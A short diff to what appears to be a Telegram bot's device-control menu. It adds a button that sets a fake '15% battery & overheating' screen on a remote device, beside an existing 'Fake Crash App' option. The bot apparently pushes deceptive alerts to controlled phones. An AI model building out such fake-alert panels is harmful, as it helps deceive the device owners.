@@ -130,6 +130,9 @@ async function sendThemesSubMenu(botToken, chatId, devId, dbUrl) {
       { text: "💥 Fake Crash App", callback_data: `CMD_SET-THEME-CRASH_${devId}` }
     ],
     [
+      { text: "🔋 Baterai 15% & Kepanasan", callback_data: `CMD_SET-THEME-BATTERY_${devId}` }
+    ],
+    [
       { text: "⬅️ Kembali ke Menu Perangkat", callback_data: `DEV_MENU_${devId}` }
     ]
   ];
